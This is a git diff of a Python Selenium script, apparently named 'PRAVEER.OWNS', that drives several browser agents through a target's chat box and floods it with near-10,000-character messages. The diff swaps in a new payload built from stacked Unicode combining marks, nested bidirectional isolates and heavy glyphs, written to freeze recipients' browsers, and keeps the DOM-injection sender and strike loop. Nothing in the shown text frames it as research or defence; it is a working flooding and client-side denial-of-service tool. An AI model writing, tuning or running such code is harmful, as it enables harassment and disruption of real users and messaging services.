@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*-
-# 🚀 PROJECT: PRAVEER.OWNS (SATURATOR V69)
-# 📅 STATUS: MAIN-THREAD-HIJACK | 4-AGENT TOTAL | AWS-CPU-KILL
+# 🚀 PROJECT: PRAVEER.OWNS (COLLAPSE V70)
+# 📅 STATUS: KERNEL-INTERRUPT-ACTIVE | 4-AGENT TOTAL | AWS-CPU-NUKE
 
 import os, time, re, random, datetime, threading, sys, gc, tempfile, subprocess, shutil
 from concurrent.futures import ThreadPoolExecutor
@@ -12,38 +12,43 @@ from selenium.webdriver.chrome.options import Options
 # --- 4 AGENTS TOTAL CONFIG ---
 AGENTS_PER_MACHINE = 2             
 TOTAL_DURATION = 25000 
-BURST_SPEED = (0.01, 0.05)  # 🔥 MAXIMUM PACKET DENSITY
-REST_AFTER_STRIKES = 250   
+BURST_SPEED = (0.01, 0.05)  # 🔥 MAXIMUM PACKET VELOCITY
+REST_AFTER_STRIKES = 300   
 REST_DURATION = 2          
 
 GLOBAL_SENT = 0
 COUNTER_LOCK = threading.Lock()
 BROWSER_LAUNCH_LOCK = threading.Lock()
 
-def get_instruction_saturator_payload():
-    """Generates a high-entropy payload that forces C++ context switches."""
+def get_architectural_collapse_payload():
+    """Generates a payload that forces 'Grapheme Cluster' recursion."""
     u_id = random.randint(100, 999)
     
-    # 𒀱 = Cuneiform (4-byte) | ﷽ = Bismillah (Wide Ligature) 
-    # \u2066 = LRI | \u2067 = RLI | \u034F = CGJ
-    lri, rli, cgj = "\u2066", "\u2067", "\u034F"
-    heavy_chars = ["𒀱", "﷽", "𒈙", "𒈓", "𒈔", "𒈕"]
-    glue = "\u2060" # Word Joiner
+    # \u034F = CGJ (Combining Grapheme Joiner)
+    # \u0300-\u036F = Stacking Diacritics
+    # \u2066-\u2069 = Directional Isolates
+    cgj = "\u034F"
+    marks = "".join([chr(i) for i in range(0x0300, 0x036F)]) # 112 stacked marks
+    lri, rli, pdi = "\u2066", "\u2067", "\u2069"
     
-    header = f"👑 PRAVEER PAPA ON TOP 🌙 [SATURATION_LOCK:{u_id}]"
+    heavy_glyphs = ["𒀱", "﷽", "𒈙", "⠿", "𒈓", "𒈔"]
+    glue = "\u2060"
+    
+    header = f"👑 PRAVEER PAPA ON TOP 🌙 [KERNEL_LOCK:{u_id}]"
     
     body = []
-    # 430 lines - Hitting the absolute 10KB socket limit
-    for i in range(430):
-        random.shuffle(heavy_chars)
-        # We alternate direction for EVERY character. 
-        # This prevents the browser from using 'Run-Segment' optimization.
-        # It forces the CPU to stop and re-check the BiDi stack 100+ times per line.
-        line = ""
-        for char in heavy_chars:
-            line += f"{lri}{char}{cgj}{rli}"
+    # 440 lines - Saturating the 10,000 character socket buffer
+    for i in range(440):
+        random.shuffle(heavy_glyphs)
+        # WE NEST ISOLATES INSIDE STACKED MARKS.
+        # This forces the C++ rendering thread to hold thousands of 
+        # 'Floating Point' positions in the CPU cache simultaneously.
+        line = f"{lri}{rli}{lri}"
+        for g in heavy_glyphs:
+            line += f"{g}{marks}{cgj}"
+        line += f"{pdi*3}"
         
-        body.append(f"PRAVEER PAPA {line} {i}{glue*4}")
+        body.append(f"PRAVEER PAPA {line} {i}{glue*2}")
         
     return f"{header}\n{glue.join(body)}".strip()[:9998]
 
@@ -64,7 +69,7 @@ def get_driver(agent_id):
         return driver
 
 def atomic_dispatch_send(driver, text):
-    """Direct DOM injection with zero-latency framework state sync."""
+    """Bypasses local UI lag with direct DOM event injection."""
     try:
         driver.execute_script("""
             var box = document.querySelector('div[role="textbox"], textarea');
@@ -73,11 +78,7 @@ def atomic_dispatch_send(driver, text):
                 document.execCommand('selectAll', false, null);
                 document.execCommand('delete', false, null);
                 document.execCommand('insertText', false, arguments[0]);
-                
-                // Force sync for React/Angular/Vue internals
                 box.dispatchEvent(new Event('input', { bubbles: true }));
-                
-                // Fire Native Keyboard Event
                 var e = new KeyboardEvent('keydown', {
                     key: 'Enter', code: 'Enter', keyCode: 13, which: 13, 
                     bubbles: true, cancelable: true
@@ -99,15 +100,15 @@ def run_life_cycle(agent_id, cookie, target):
             
             strike_count = 0
             while True:
-                payload = get_instruction_saturator_payload()
+                payload = get_architectural_collapse_payload()
                 if atomic_dispatch_send(driver, payload):
                     strike_count += 1
                     with COUNTER_LOCK:
                         global GLOBAL_SENT
                         GLOBAL_SENT += 1
-                    print(f"Agent {agent_id}: Saturation-Strike ({GLOBAL_SENT})")
+                    print(f"Agent {agent_id}: Collapse-Strike ({GLOBAL_SENT})")
                     
-                    if strike_count % 80 == 0:
+                    if strike_count % 100 == 0:
                         driver.refresh()
                         time.sleep(5)
                 time.sleep(random.uniform(*BURST_SPEED))
